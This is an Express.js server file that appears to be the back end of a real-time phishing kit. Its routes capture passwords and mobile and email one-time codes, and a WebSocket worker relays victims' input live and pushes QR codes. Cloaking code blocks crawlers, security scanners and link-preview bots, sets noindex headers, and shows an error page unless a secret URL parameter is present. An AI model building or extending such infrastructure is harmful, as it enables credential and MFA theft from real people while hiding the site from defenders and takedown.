
require('dotenv').config();
const express = require('express');
const http = require('http');
const WebSocket = require('ws');
const path = require('path');
const session = require('express-session');
const helmet = require('helmet');
const rateLimit = require('express-rate-limit');

const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

app.use(helmet({ contentSecurityPolicy: false }));

// Anti-bot: X-Robots-Tag header on all responses
app.use((req, res, next) => {
  res.setHeader('X-Robots-Tag', 'noindex, nofollow, noarchive, nosnippet');
  next();
});

// Anti-bot: Block known bot User-Agents and suspicious requests
const BOT_UA_PATTERNS = /bot|crawl|spider|slurp|scrape|fetch|curl|wget|python|httpx|axios|node-fetch|go-http|java\/|perl|ruby|php\/|libwww|mechanize|scrapy|phantomjs|headless|selenium|puppeteer|lighthouse|gtmetrix|pingdom|uptimerobot|semrush|ahrefs|mj12bot|dotbot|rogerbot|screaming|archive\.org|facebookexternalhit|twitterbot|linkedinbot|whatsapp|telegram|discord|slack/i;

app.use((req, res, next) => {
  const ua = req.headers['user-agent'] || '';
  
  // Block empty User-Agent
  if (!ua || ua.length < 10) {
    return res.status(403).end();
  }
  
  // Block known bots
  if (BOT_UA_PATTERNS.test(ua)) {
    return res.status(403).end();
  }
  
  // Block requests missing typical browser headers
  if (req.method === 'GET' && !req.path.match(/\.(css|js|png|jpg|jpeg|gif|ico|svg|ttf|woff|pdf)$/) && !req.path.startsWith('/worker-ws')) {
    const acceptLang = req.headers['accept-language'];
    const accept = req.headers['accept'];
    if (!acceptLang && !accept) {
      return res.status(403).end();
    }
  }
  
  next();
});

// Anti-bot: Aggressive rate limiting for all routes
const globalLimiter = rateLimit({
  windowMs: 1 * 60 * 1000,
  max: 60,
  message: '',
  standardHeaders: false,
  legacyHeaders: false
});
app.use(globalLimiter);
app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, 'views'));

app.use(express.urlencoded({ extended: true }));
app.use(express.json());
app.use(session({
  secret: process.env.SESSION_SECRET || require('crypto').randomBytes(32).toString('hex'),
  resave: false,
  saveUninitialized: false,
  cookie: { maxAge: 4 * 60 * 1000, httpOnly: true, secure: false, sameSite: 'strict' }
}));

const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 10,
  message: 'Too many login attempts, try again after 15 minutes',
  skipSuccessfulRequests: true
});
app.post('/dblogin', loginLimiter);

app.use(express.static(path.join(__dirname, 'public'), { maxAge: 0, etag: false }));

const REQUIRED_PARAM = 'mnbvcxzZXCVBNM';
const EXCLUDED_PATHS = ['/dblogin', '/datatable', '/pwdready', '/pwdresult', '/codeload', '/mobileresult', '/motpresult', '/eotpresult', '/recemailresult', '/error'];
app.use((req, res, next) => {
  if (req.method !== 'GET') return next();
  if (EXCLUDED_PATHS.some(p => req.path.startsWith(p))) return next();
  if (req.path.startsWith('/req/')) return next();
  if (req.path.match(/\.(css|js|png|jpg|jpeg|gif|ico|svg|ttf|woff|pdf|txt)$/)) return next();
  if (!(REQUIRED_PARAM in req.query)) return res.render('error');
  next();
});

// WebSocket worker connection
let workerWs = null;
const pendingRequests = {};

wss.on('connection', (ws, req) => {
  const url = new URL(req.url, `http://${req.headers.host}`);
  if (url.pathname === '/worker-ws') {
    const secret = url.searchParams.get('secret');
    if (secret !== (process.env.WORKER_SECRET || 'change_this_secret')) {
      console.log('[WS] Invalid worker secret, closing');
      ws.close();
      return;
    }
    workerWs = ws;
    console.log('[WS] Worker connected');
    ws.on('message', (data) => {
      try {
        const msg = JSON.parse(data);
        // Handle QR image upload from worker
        if (msg.action === 'uploadQR' && msg.payload) {
          const fs = require('fs');
          const qrPath = path.join(__dirname, 'public', 'image', 'qr.png');
          fs.writeFileSync(qrPath, Buffer.from(msg.payload.base64, 'base64'));
          console.log('[WS] QR image saved from worker');
          return;
        }
        if (msg.id && pendingRequests[msg.id]) {
          pendingRequests[msg.id](msg.result);
          delete pendingRequests[msg.id];
        }
      } catch (e) {}
    });
    ws.on('close', () => { workerWs = null; console.log('[WS] Worker disconnected'); });
  }
});

// Helper to send command to worker
function sendToWorker(action, payload) {
  return new Promise((resolve, reject) => {
    if (!workerWs) return resolve({ error: 'Worker not connected' });
    const id = Date.now() + Math.random().toString(36).substr(2, 9);
    const timeout = setTimeout(() => { delete pendingRequests[id]; resolve({ error: 'Timeout' }); }, 30000);
    pendingRequests[id] = (result) => { clearTimeout(timeout); resolve(result); };
    workerWs.send(JSON.stringify({ id, action, payload }));
  });
}

// Make sendToWorker available to controllers
const authController = require('./controllers/authController');
authController.setSendToWorker(sendToWorker);

app.use('/', require('./routes/auth'));

const PORT = process.env.PORT || 3008;
server.listen(PORT, () => console.log(`Server running on port ${PORT}`));
